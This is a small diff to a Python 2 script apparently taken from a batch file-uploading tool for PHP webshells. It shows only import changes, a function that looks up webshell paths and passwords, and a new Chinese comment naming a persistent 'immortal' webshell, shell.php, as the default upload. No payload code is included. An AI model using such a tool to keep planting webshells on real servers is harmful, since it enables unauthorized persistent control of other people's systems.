@@ -1,8 +1,8 @@
 # coding=utf-8
 # code from https://github.com/brianwrf/fileBatchUpload
+
 import urllib
 import urllib2
-import sys
 import base64
 import re
 
@@ -26,7 +26,7 @@ def get_shell_path(posturl,passwd):
         pass
     return shell_path
 
-
+# 默认为auxi目录下的shell.php 不死马
 def upload(localpath='auxi/shell.php'):
     print '\n+++++++++Batch Uploading Local File (Only for PHP webshell)++++++++++\n'
     shellfile = 'auxi/webshell.txt'  # 存放webshell路径和密码的文件
